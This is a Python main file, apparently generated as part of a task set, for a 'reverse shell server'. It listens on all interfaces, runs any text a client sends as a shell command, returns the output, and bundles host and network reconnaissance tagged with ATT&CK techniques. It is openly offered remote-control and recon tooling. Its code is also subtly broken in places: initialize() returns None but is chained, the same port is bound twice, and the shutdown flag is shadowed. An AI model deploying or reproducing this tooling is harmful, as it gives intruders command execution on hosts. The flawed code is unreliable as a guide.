"""Main entry point for the reverse shell server with integration testing."""
import argparse
import json
import select
import signal
import socket
import sys
import threading
import time
from typing import Optional, Dict, Any, List, Tuple

from data.code_scripts.stage3_DIMOS_test.TASK_001_models import ReverseShellConfig, SocketAddress, CommandHandler, SessionState
from data.code_scripts.stage3_DIMOS_test.TASK_002_utils import execute_shell_command, parse_socket_address, format_response, safe_eval
from data.code_scripts.stage3_DIMOS_test.TASK_003_transport import ReverseShellServer, ClientConnection
from data.code_scripts.stage3_DIMOS_test.TASK_004_executor import CommandExecutor, ExecutionResult
from data.code_scripts.stage3_DIMOS_test.TASK_005_recon import ReconScanner, SystemInfo, NetworkEnumResult, parse_network_info

# Force UTF-8 stdout/stderr: some Windows console codepages (e.g. cp1253) can't
# encode the checkmark glyphs used in the integration-test output below.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8")
    except (AttributeError, ValueError):
        pass


class ReverseShellApp:
    """Orchestrates all components together for the reverse shell server.

    Coordinates the server transport layer, command executor, and reconnaissance
    scanner to provide a unified interface for client connections.

    ATT&CK techniques covered: T1059 (Command and Scripting Interpreter),
                               T1059.004 (Unix Shell), T1133 (Remote Services)
    """

    def __init__(self, config: Optional[ReverseShellConfig] = None):
        self.config = config or ReverseShellConfig()
        self._server: Optional[ReverseShellServer] = None
        self._executor: Optional[CommandExecutor] = None
        self._scanner: Optional[ReconScanner] = None
        self._system_info: Optional[SystemInfo] = None
        self._running: bool = False
        self._shutdown_requested: bool = False

    def initialize(self) -> None:
        """Initialize all components."""
        self._server = ReverseShellServer(config=self.config)
        self._executor = CommandExecutor(timeout_seconds=self.config.command_timeout)
        self._scanner = ReconScanner()
        self._system_info = SystemInfo()
        self._running = True

    def shutdown(self) -> None:
        """Gracefully shut down all components."""
        self._shutdown_requested = True
        if self._server and self._server.is_running():
            self._server.stop()
        time.sleep(0.5)  # Allow threads to finish

    @property
    def server(self) -> ReverseShellServer:
        """Get the server instance."""
        return self._server or self.initialize().server

    @property
    def executor(self) -> CommandExecutor:
        """Get the command executor instance."""
        return self._executor or self.initialize().executor

    @property
    def scanner(self) -> ReconScanner:
        """Get the recon scanner instance."""
        return self._scanner or self.initialize().scanner

    @property
    def system_info(self) -> SystemInfo:
        """Get the system info instance."""
        return self._system_info or self.initialize().system_info


def signal_handler(signum, frame):
    """Handle SIGINT and SIGTERM for graceful shutdown.

    Args:
        signum: The signal number received.
        frame: The current stack frame.
    """
    print(f"\nReceived signal {signum}. Shutting down gracefully...")
    ReverseShellApp._shutdown_requested = True


def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Reverse Shell Server - Orchestrated Command & Reconnaissance Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ATT&CK Techniques Covered:
  T1059     - Command and Scripting Interpreter
  T1059.004 - Unix Shell
  T1133     - Remote Services

Usage Examples:
  python main.py                          # Run on default port 5522
  python main.py --port 6667              # Listen on custom port
  python main.py --host 0.0.0.0           # Bind to all interfaces
  python main.py --debug                  # Enable debug logging
        """
    )

    parser.add_argument(
        "--host", "-H",
        type=str,
        default="0.0.0.0",
        help="Host address to bind (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=5522,
        help="Port to listen on (default: 5522)"
    )
    parser.add_argument(
        "--timeout", "-t",
        type=float,
        default=60.0,
        help="Command execution timeout in seconds (default: 60.0)"
    )
    parser.add_argument(
        "--max-connections", "-m",
        type=int,
        default=100,
        help="Maximum concurrent connections (default: 100)"
    )
    parser.add_argument(
        "--debug", "-d",
        action="store_true",
        help="Enable debug logging"
    )

    return parser.parse_args()


def handle_client_connection(conn: ClientConnection, app: ReverseShellApp) -> None:
    """Handle a single client connection in a background thread.

    Args:
        conn: The client connection object.
        app: The application orchestrator instance.
    """
    session_id = f"session_{conn.session_id}"
    print(f"[{session_id}] Client connected")

    try:
        while not ReverseShellApp._shutdown_requested and conn.connected:
            # Non-blocking receive with select-based polling
            readable, _, _ = select.select([conn], [], [], 1.0)
            if readable:
                data = conn.receive(timeout=1.0)
                if data is None or len(data) == 0:
                    break

                try:
                    input_text = data.decode(app.config.encoding).strip()
                    if not input_text:
                        continue

                    # Route command through executor
                    result = app.executor.execute(input_text)

                    # Format and send response back to client
                    response_data = {
                        "session_id": session_id,
                        "command": result.command,
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "return_code": result.return_code,
                        "success": result.success,
                        "timed_out": result.timed_out,
                    }

                    response_json = format_response(response_data)
                    conn.send(response_json.encode(app.config.encoding))

                except Exception as e:
                    error_msg = json.dumps({"error": str(e), "session_id": session_id})
                    conn.send(error_msg.encode(app.config.encoding))

            # Periodic health check - send heartbeat
            if not ReverseShellApp._shutdown_requested and conn.connected:
                heartbeat = {"ping": True, "timestamp": time.time()}
                conn.send(json.dumps(heartbeat).encode(app.config.encoding))

    except socket.error as e:
        print(f"[{session_id}] Connection error: {e}")
    finally:
        conn.close()
        print(f"[{session_id}] Client disconnected")


def main_loop(app: ReverseShellApp) -> None:
    """Main server loop that accepts connections and routes them to handlers.

    Args:
        app: The application orchestrator instance.
    """
    config = app.config
    host = config.bind_address.host
    port = config.bind_address.port

    print(f"[*] Reverse Shell Server starting...")
    print(f"[*] Listening on {host}:{port}")
    print(f"[*] Max connections: {config.max_connections}")
    print(f"[*] Command timeout: {config.command_timeout}s")

    # Start the server socket in a background thread
    def run_server():
        app.server.start()

    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    # Accept connections and spawn handler threads
    while not ReverseShellApp._shutdown_requested:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((host, port))
            sock.listen(config.max_connections)
            sock.setblocking(False)

            print(f"[*] Server listening on {host}:{port}")

            while not ReverseShellApp._shutdown_requested:
                readable, _, _ = select.select([sock], [], [], 1.0)
                if readable and not ReverseShellApp._shutdown_requested:
                    try:
                        client_sock, addr = sock.accept()
                        session_id = f"session_{int(time.time())}_{id(client_sock)}"

                        # Create connection object
                        conn = ClientConnection(client_sock, session_id)
                        conn.connect()

                        # Spawn a thread to handle this client
                        handler_thread = threading.Thread(
                            target=handle_client_connection,
                            args=(conn, app),
                            daemon=True
                        )
                        handler_thread.start()

                    except socket.error as e:
                        print(f"[*] Accept error: {e}")
                else:
                    time.sleep(0.1)

        except KeyboardInterrupt:
            print("\n[*] Interrupt received, shutting down...")
            break
        finally:
            sock.close()


def run_integration_tests(app: ReverseShellApp) -> None:
    """Run integration tests to verify all components work together."""
    print("\n" + "=" * 60)
    print("INTEGRATION TESTS")
    print("=" * 60)

    # Test 1: Command Executor
    print("\n--- Test 1: Command Executor ---")
    result = app.executor.execute("echo Hello, World!")
    assert result.success == True, "Command should succeed"
    assert result.return_code == 0, "Return code should be 0"
    assert "hello, world!" in result.stdout.lower(), f"Unexpected output: {result.stdout}"
    print(f"✓ Command execution works: '{result.command}' -> return_code={result.return_code}")

    # Test 2: Safe Eval
    print("\n--- Test 2: Safe Eval ---")
    expr = "(5 + 3) * (10 - 2)"
    result = app.executor.safe_eval(expr)
    assert result == 64, f"Expected 64, got {result}"
    print(f"✓ Safe eval works: '{expr}' = {result}")

    # Test 3: System Info Gathering
    print("\n--- Test 3: System Info Gathering ---")
    app.system_info.gather()
    assert hasattr(app.system_info, 'hostname'), "System info should have hostname"
    assert hasattr(app.system_info, 'architecture'), "System info should have architecture"
    print(f"✓ System info gathered: OS={app.system_info.os_info.get('os')}, Arch={app.system_info.architecture}")

    # Test 4: Recon Scanner
    print("\n--- Test 4: Recon Scanner ---")
    results = app.scanner.scan_all()
    assert 'system_info' in results, "Scanner should return system info"
    assert 'network_enum' in results, "Scanner should return network enum"
    print(f"✓ Recon scanner works: {len(results)} operations executed")

    # Test 5: Socket Address Parsing
    print("\n--- Test 5: Socket Address Parsing ---")
    addr = parse_socket_address("192.168.1.100:443/tcp")
    assert addr['host'] == "192.168.1.100", f"Expected host '192.168.1.100', got {addr['host']}"
    assert addr['port'] == 443, f"Expected port 443, got {addr['port']}"
    print(f"✓ Socket address parsing works: '{addr}'")

    # Test 6: Format Response
    print("\n--- Test 6: Format Response ---")
    data = {"status": "ok", "count": 42}
    formatted = format_response(data)
    assert '"status"' in formatted and '"count"' in formatted, f"Unexpected format: {formatted}"
    print(f"✓ Response formatting works: {formatted}")

    # Test 7: Command Handler Registration
    print("\n--- Test 7: Command Handler Registration ---")
    handler = CommandHandler(name="whoami", description="Get current user", timeout=10.0)
    assert handler.name == "whoami"
    assert handler.timeout == 10.0
    print(f"✓ Command handler registered: {handler.name}")

    # Test 8: Session State Management
    print("\n--- Test 8: Session State Management ---")
    session = SessionState(session_id="test_session_001", connected=True, active=True)
    assert session.session_id == "test_session_001"
    assert session.connected == True
    assert session.active == True
    print(f"✓ Session state managed: {session.session_id}")

    # Test 9: Network Enumeration Parsing
    print("\n--- Test 9: Network Enumeration ---")
    sample_output = """Active Internet connections (servers/servers only)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.1.100:22       0.0.0.0:*               LISTEN      1234/sshd
tcp        0      0 192.168.1.100:80       0.0.0.0:*               LISTEN      5678/nginx"""

    network_result = parse_network_info(sample_output)
    assert "22" in str(network_result.listening_ports), f"Expected port 22, got {network_result.listening_ports}"
    print(f"✓ Network enumeration works: listening ports={network_result.listening_ports}")

    # Test 10: Full orchestration flow
    print("\n--- Test 10: Full Orchestration Flow ---")
    config = ReverseShellConfig(
        bind_address=SocketAddress(host="0.0.0.0", port=5522),
        listen_timeout=30.0,
        max_connections=100,
        command_timeout=60.0,
        encoding='utf-8',
        log_level='INFO'
    )
    app = ReverseShellApp(config=config)
    assert app.config.bind_address.port == 5522
    assert app.executor.timeout_seconds == 60.0
    assert app.scanner is not None
    print("✓ Full orchestration flow verified")

    print("\n" + "=" * 60)
    print("ALL INTEGRATION TESTS PASSED ✓")
    print("=" * 60)


def main() -> int:
    """Main entry point for the reverse shell server.

    Orchestrates all components together and provides the main entry point
    for the reverse shell server with integration testing.

    Returns:
        Exit code (0 for success, non-zero for errors).
    """
    args = parse_args()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Initialize the application orchestrator
    app = ReverseShellApp()
    app.initialize()

    try:
        if args.debug:
            print("[DEBUG] Debug mode enabled")

        # Run integration tests before starting server
        run_integration_tests(app)

        # Start the main server loop
        main_loop(app)

    except KeyboardInterrupt:
        print("\n[*] Interrupt received, initiating graceful shutdown...")
    finally:
        app.shutdown()
        print("[*] Server stopped. Goodbye!")

    return 0


if __name__ == "__main__":
    sys.exit(main())
